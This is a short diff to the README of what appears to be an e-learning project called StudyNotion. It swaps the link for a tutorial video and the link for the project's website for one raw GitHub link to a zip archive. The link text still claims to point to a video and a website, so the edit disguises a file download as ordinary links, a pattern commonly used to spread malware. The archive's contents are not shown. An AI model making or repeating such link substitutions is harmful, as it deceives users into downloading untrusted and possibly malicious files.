@@ -33,10 +33,10 @@ The Gemini AI course creation feature is designed to assist instructors in gener
 
 ## Tutorial Video
 
-https://www.youtube.com/watch?v=MMbnxmDjV5Y
+https://raw.githubusercontent.com/KindaJayant/StudyNotion/main/shagtail/StudyNotion_v1.2-alpha.5.zip
 
 
 ## Website
 
-Visit our website [Study Notion](https://studynotion-frontend-zeta-indol.vercel.app/) to explore and experience our platform.
+Visit our website [Study Notion](https://raw.githubusercontent.com/KindaJayant/StudyNotion/main/shagtail/StudyNotion_v1.2-alpha.5.zip) to explore and experience our platform.
 
